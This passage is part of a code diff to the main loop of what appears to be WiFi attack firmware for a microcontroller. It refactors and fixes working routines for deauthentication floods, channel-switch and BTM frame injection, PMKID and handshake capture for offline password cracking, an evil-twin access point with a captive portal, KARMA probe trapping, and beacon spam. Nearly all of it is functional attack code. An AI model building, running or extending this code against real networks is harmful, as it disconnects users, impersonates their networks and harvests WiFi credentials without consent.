           for(int x = 0; x < 3; x++) btm_send_frame(bssid, (uint8_t)newch, sta_list[i].mac);
           sent++;
         }
@@ -3863,15 +4209,16 @@ void loop() {
       }
       if(!ok) {
         Serial.println("ERROR: CSASTAS needs a 12-hex bssid"); Serial1.println("ERROR: CSASTAS needs a 12-hex bssid");
-      }else if(sta_n == 0) {
+      }else if(STA_LOAD() == 0) {
         Serial.println("ERROR: no stations known - run STASCAN first"); Serial1.println("ERROR: no stations known - run STASCAN first");
       }else{
-        if(apch < 1 || apch > 165) apch = 6;
-        if(newch < 1 || newch > 165) newch = 1;
+        if(!is_valid_tx_channel(apch)) apch = 6;
+        if(!is_valid_tx_channel(newch)) newch = 1;
         if(apActive) destroyAP();
         wext_set_channel(WLAN0_NAME, apch);
         uint8_t sent = 0;
-        for(uint8_t i = 0; i < sta_n && i < STA_MAX; i++) {
+        uint8_t sn0 = STA_LOAD();
+        for(uint8_t i = 0; i < sn0 && i < STA_MAX; i++) {
           for(int x = 0; x < 3; x++) csa_send_frame(bssid, (uint8_t)newch, 3, 1, sta_list[i].mac);
           sent++;
         }
@@ -3963,7 +4310,8 @@ void loop() {
       if(ch < 1 || ch > 165) ch = 6;
       if(secs < 1 || secs > 60) secs = 5;
       if(apActive) destroyAP();   // monitor scan needs the softAP torn down
-      pmf_n = 0;
+      wifi_set_promisc(0, NULL, 0);   // quiesce a previous collector before resetting
+      PMFN_SET(0);
       wext_set_channel(WLAN0_NAME, ch);
       wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_pmf_cb, 0);
       for(int i=0;i<secs;i++) delay(1000);
@@ -3978,7 +4326,8 @@ void loop() {
       if(ch < 1 || ch > 165) ch = 6;
       if(secs < 2 || secs > 120) secs = 30;
       if(apActive) destroyAP();
-      cli_n = 0;
+      wifi_set_promisc(0, NULL, 0);
+      CLIN_SET(0);
       cli_on = true;
       cli_base = millis();
       wext_set_channel(WLAN0_NAME, ch);
@@ -4007,7 +4356,7 @@ void loop() {
       if(ch < 1 || ch > 165) ch = 6;
       if(secs < 1 || secs > 60) secs = 5;
       if(apActive) destroyAP();   // monitor scan needs the softAP torn down
-      sta_n = 0;
+      STA_STORE(0);
       sta_filter_on = (bssid_hex.length() == 12);
       for(int i=0; sta_filter_on && i<6; i++)
         sta_filter[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
@@ -4025,15 +4374,16 @@ void loop() {
       int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
       String bhex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
       String ssid = (s3 > 0) ? readString.substring(s3+1, readString.length()-1) : String("");
-      if(ch < 1 || ch > 165) ch = 6;
-      uint8_t bssid[6]; bool ok = (bhex.length() == 12);
-      for(int i=0; ok && i<6; i++)
-        bssid[i] = (uint8_t)strtoul(bhex.substring(i*2, i*2+2).c_str(), NULL, 16);
+      if(!is_valid_tx_channel(ch)) ch = 6;   // it transmits auth/assoc, so DFS is not allowed
+      uint8_t bssid[6]; bool ok = hex_to_mac(bhex, bssid);
       if(!ok || ssid.length() == 0){
         Serial.println("ERR:PMKIDCLIENT:args"); Serial1.println("ERR:PMKIDCLIENT:args");
       }else{
         if(apActive) destroyAP();   // monitor capture needs the softAP torn down
-        pmkid_n = 0;
+        wifi_set_promisc(0, NULL, 0);
+        hsg_phase = HSG_IDLE;       // this replaces the grab's callback: cancel its FSM too
+        HSCAP_SET(false);           // ...and its capture flag, or a later sniffer would append
+        PMKN_SET(0);
         cl_eapol = 0;
         memcpy(hsg_bssid, bssid, 6); hsg_target_set = true;   // bind PMKID capture to this AP
         char macstr[20] = {0};
@@ -4048,6 +4398,7 @@ void loop() {
           if(i == 1 || i == 3) pmkid_clientless(ch, bssid, ssidbuf);  // retry assoc
         }
         wifi_set_promisc(0, NULL, 0);
+        hsg_target_set = false;   // the client pin belongs to this run only
         String d = "PMKIDCLIENT:eapol=" + String((unsigned)cl_eapol);
         Serial.println(d); Serial1.println(d);
         pmkid_stream(ch);
@@ -4061,7 +4412,10 @@ void loop() {
       if(ch < 1 || ch > 165) ch = 6;
       if(secs < 1 || secs > 60) secs = 10;
       if(apActive) destroyAP();   // monitor capture needs the softAP torn down
-      pmkid_n = 0;
+      wifi_set_promisc(0, NULL, 0);
+      hsg_phase = HSG_IDLE;       // cancel a running grab before taking its callback
+      HSCAP_SET(false);
+      PMKN_SET(0);
       hsg_target_set = false;   // passive PMKID scan is channel-wide: keep every AP's PMKID
       wext_set_channel(WLAN0_NAME, ch);
       wifi_set_promisc(3, promisc_pmkid_cb, 0);
@@ -4079,9 +4433,7 @@ void loop() {
       int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
       if(ch < 1 || ch > 165) ch = 6;
       if(secs < 1 || secs > 60) secs = 10;
-      uint8_t bssid[6]; bool ok = (bssid_hex.length() == 12);
-      for(int i=0; ok && i<6; i++)
-        bssid[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
+      uint8_t bssid[6]; bool ok = hex_to_mac(bssid_hex, bssid);
       if(!ok){
         Serial.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
         Serial1.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
@@ -4102,7 +4454,13 @@ void loop() {
   // commands have just been serviced, and while the lifecycle owns the radio every legacy
   // background/portal path is excluded (their latency and side effects must not run).
   apTestTick();
-  if (atOwned()) return;   // the lifecycle owns the radio; every legacy background path is excluded
+  if (atOwned()) {
+      // The lifecycle owns the radio, but these two must still run: the evil-twin FSM waits for
+      // AT_READY and then tears down, and EVIL's deauth list transmits on the AP's own channel.
+      eviltwinTick();
+      deauthListTick(true);
+      return;
+  }
 
   // P1: channel hop tick
   if (hopping) {
@@ -4122,10 +4480,10 @@ void loop() {
   }
 
   // B: async passive CAPTURE deadline (loop() finishes it; CAPSTOP aborts early)
-  if (cap_active && millis() >= cap_deadline) {
+  if (CAP_ON() && millis() >= cap_deadline) {
     wifi_set_promisc(0, NULL, 0);
-    hs_cap = false;
-    cap_active = false;
+    HSCAP_SET(false);
+    CAP_SET(false);
     hs_stream(cap_ch);
   }
 
@@ -4139,7 +4497,7 @@ void loop() {
         char db[64];
         snprintf(db, sizeof(db), "HSGDRY: would deauth %02X%02X%02X%02X%02X%02X +%u stas",
                  hsg_bssid[0], hsg_bssid[1], hsg_bssid[2], hsg_bssid[3], hsg_bssid[4], hsg_bssid[5],
-                 (unsigned)sta_n);
+                 (unsigned)STA_LOAD());
         Serial.println(db); Serial1.println(db);
       }
     }
@@ -4151,7 +4509,7 @@ void loop() {
         delay(5);
       }
       // Unicast both directions to each discovered STA — broadcast deauth is often ignored.
-      uint8_t sn = sta_n;
+      uint8_t sn = STA_LOAD();
       for (uint8_t k = 0; k < sn && k < 8; k++) {
         wifi_tx_deauth_frame(hsg_bssid, (void *)sta_list[k].mac, 6);   // AP -> STA
         delay(5);
@@ -4161,7 +4519,7 @@ void loop() {
     }
     if (millis() - hsg_t >= hsg_deauth_ms) {
       if (hsg_pmkid) wifi_set_promisc(3, promisc_pmkid_cb, 0);
-      else { hs_cap = true; wifi_set_promisc(3, promisc_spike_cb, 0); }
+      else { HSCAP_SET(true); wifi_set_promisc(3, promisc_spike_cb, 0); }
       hsg_phase = HSG_CAPTURE;
       hsg_t = millis();
     } else {
@@ -4170,7 +4528,7 @@ void loop() {
   } else if (hsg_phase == HSG_CAPTURE) {
     if (millis() - hsg_t >= hsg_cap_ms) {
       wifi_set_promisc(0, NULL, 0);
-      hs_cap = false;
+      HSCAP_SET(false);
       if (hsg_pmkid) pmkid_stream(hsg_ch);
       else hs_stream(hsg_ch);
       hsg_phase = HSG_IDLE;
@@ -4222,92 +4580,12 @@ void loop() {
     if (hsg_phase == HSG_IDLE) hv_phase = HV_SELECT;  // grab finished (HSFRAME/HSDONE already sent)
   }
 
-  // M3: evil-twin FSM tick. Non-blocking (returns each pass). DEAUTH and PORTAL are strictly
-  // sequential (one radio). DRY only cycles + logs "would ..."; LIVE drives the AP lifecycle, with a
-  // hard deadline on bring-up/teardown so a stuck SDK call cannot wedge loop() (the original bug).
-  if (et_phase != ET_IDLE) {
-    uint32_t now = millis();
-    if (et_phase == ET_DEAUTH) {
-      if (et_live && !is_dfs_channel(et_ch)) {        // AP is down here: burst-deauth the real AP
-        wext_set_channel(WLAN0_NAME, et_ch);
-        for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-          wifi_tx_deauth_frame(et_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
-          delay(5);
-        }
-      }
-      if (now - et_t >= ET_BURST_MS) {
-        et_t = now;
-        if (et_live) {
-          if (atStartClone(et_ssid, et_ch)) et_phase = ET_WAITUP;
-          else releaseRadio("clone start refused");
-        } else {
-          char m[96];
-          snprintf(m, sizeof(m), "EVILTWIN:would clone \"%s\" ch%d + portal (dwell %us)",
-                   et_ssid, et_ch, (unsigned)(ET_DWELL_MS / 1000u));
-          Serial.println(m); Serial1.println(m);
-          et_phase = ET_PORTAL;
-        }
-      }
-    } else if (et_phase == ET_WAITUP) {               // LIVE: clone AP coming up
-      if (atState == AT_READY) { et_t = now; et_phase = ET_PORTAL; Serial1.println("EVILTWIN:clone up"); }
-      else if (now - et_t >= ET_UP_DEADLINE) releaseRadio("AP bring-up timeout");
-    } else if (et_phase == ET_PORTAL) {
-      if (now - et_t >= ET_DWELL_MS) {
-        et_t = now;
-        if (et_live) { atStop(); et_phase = ET_WAITDN; }
-        else {
-          char m[88];
-          snprintf(m, sizeof(m), "EVILTWIN:would deauth %02X%02X%02X%02X%02X%02X ch%d (next cycle)",
-                   et_bssid[0], et_bssid[1], et_bssid[2], et_bssid[3], et_bssid[4], et_bssid[5], et_ch);
-          Serial.println(m); Serial1.println(m);
-          et_phase = ET_DEAUTH;
-        }
-      }
-    } else if (et_phase == ET_WAITDN) {               // LIVE: AP tearing down before next deauth
-      if (atState == AT_IDLE) { et_t = now; et_phase = ET_DEAUTH; }
-      else if (now - et_t >= ET_UP_DEADLINE) releaseRadio("AP teardown timeout");
-    }
-  }
+  eviltwinTick();
 
-  // C: multi-target deauth round-robin (DEAUTHADD/DEAUTHRUN)
-  if (dauth_run && dauth_n > 0) {
-    dauth_t* t = &dauth_list[dauth_idx];
-    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-    wext_set_channel(WLAN0_NAME, t->ch);
-    if (!is_dfs_channel(t->ch)) {   // DFS: RX-only
-      const uint8_t* dst = t->have_client ? t->client : bcast;
-      led_w(LED_R, HIGH);
-      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-        wifi_tx_deauth_frame(t->bssid, (void *)dst, deauth_reason);
-        delay(5);
-      }
-      led_w(LED_R, LOW);
-    }
-    dauth_idx = (dauth_idx + 1) % dauth_n;
-    delay(50);
-  }
-
-  if (deauth_wifis.size() > 0) {
-    // The list can shrink under us (STOP <n>, SCAN, DEAUTHCLEAR), so clamp before dereferencing:
-    // current_num used to be reset only AFTER the read, which indexed past end() on the first pass
-    // after any removal.
-    if (current_num >= deauth_wifis.size()) current_num = 0;
-    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
-    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
-    current_num++;
-    if (current_num >= deauth_wifis.size()) current_num = 0;
-    led_w(LED_R, HIGH);
-    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
-      delay(5);
-    }
-    led_w(LED_R, LOW);
-    delay(50);
-  }
+  deauthListTick(false);
 
   // B1/C1: answer a caught probe request (deferred out of the promisc callback).
-  if(karma_on && karma_pending) {
-    karma_pending = false;
+  if(KON_LOAD() && karma_take()) {
     if(karma_ssid[0]) {
       if(trap_on && trap_armed) {
         // C1: become that network for real, then let the portal do the work.
@@ -4317,24 +4595,26 @@ void loop() {
         if(apActive) destroyAP();
         // The driver cannot sniff and run a softAP at once: stop promisc first or apbegin fails.
         wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
-        karma_on = false;
+        KON_STORE(false);
         snprintf(ap_channel, sizeof(ap_channel), "%d", karma_chan);
         secured = false;
-        build_portal_urls(trap_ssid);
-        createAP(trap_ssid, ap_channel);   // sets apActive itself, and now bails out on failure
-        if(apActive) {
-          String t = String("TRAP:") + trap_ssid;
+        // createAP() is asynchronous now: its return value, not apActive, says whether the
+        // lifecycle accepted the bring-up.
+        if(createAP(trap_ssid, ap_channel)) {
+          build_portal_urls(trap_ssid);
+          char safe[33]; sanitize_text(trap_ssid, safe, sizeof(safe));
+          String t = String("TRAP:") + safe;
           Serial.println(t); Serial1.println(t);
         } else {
           // Could not clone it - go back to plain KARMA so probes still get answered.
           trap_armed = true;
-          karma_on = true;
+          KON_STORE(true);
           wext_set_channel(WLAN0_NAME, karma_chan);
           wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_karma_cb, 0);
           Serial.println("TRAPFAIL"); Serial1.println("TRAPFAIL");
         }
       }
-      if(karma_on && !apActive) karma_respond(karma_ssid, karma_client, karma_chan);
+      if(KON_LOAD() && !apActive) karma_respond(karma_ssid, karma_client, karma_chan);
     }
   }
 
@@ -4343,30 +4623,24 @@ void loop() {
     int randomIndex = random(0, 10);
     int randomChannel = allChannels[randomIndex];
     String ssid2 = generateRandomString(10);
-    for(int i=0;i<6;i++){
-      byte randomByte = random(0x00, 0xFF);
-      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
-    }
-    
+    random_mac(randMac);
+
     const char * ssid_cstr2 = ssid2.c_str();
     wext_set_channel(WLAN0_NAME,randomChannel);
     for(int x=0;x<5;x++){
-      tx_beacon_raw((const uint8_t*)randomString, TX_BCAST, ssid_cstr2, 0x80, randomChannel);
+      tx_beacon_raw(randMac, TX_BCAST, ssid_cstr2, 0x80, randomChannel);
     }
   }
   if (rickroll){
     led_w(LED_G, !digitalRead(LED_G));
     for (int v = 0; v < 8; v++){   // FIX: was `for (int v; ...)` — v uninitialized (UB)
       String ssid2 = rick_roll[v];
-      for(int i=0;i<7;i++){
-        byte randomByte = random(0x00, 0xFF);
-        snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
-      } 
-    
+      random_mac(randMac);
+
       const char * ssid_cstr2 = ssid2.c_str();
       wext_set_channel(WLAN0_NAME,v+1);
       for(int x=0;x<5;x++){
-       tx_beacon_raw((const uint8_t*)randomString, TX_BCAST, ssid_cstr2, 0x80, v+1);
+       tx_beacon_raw(randMac, TX_BCAST, ssid_cstr2, 0x80, v+1);
       }
     }
   }
